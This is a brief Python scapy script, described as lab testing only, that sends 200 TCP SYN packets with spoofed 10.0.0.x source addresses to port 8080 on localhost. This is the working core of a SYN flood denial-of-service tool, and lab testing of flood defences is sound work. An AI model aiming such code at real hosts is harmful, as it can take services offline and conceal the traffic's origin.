#!/usr/bin/env python3
"""SYN flood-like traffic for lab testing only."""
from scapy.all import IP, TCP, send

dst = "127.0.0.1"
dport = 8080
for i in range(200):
    pkt = IP(src=f"10.0.0.{i%5 + 1}", dst=dst) / TCP(sport=10000 + i, dport=dport, flags="S")
    send(pkt, verbose=False)
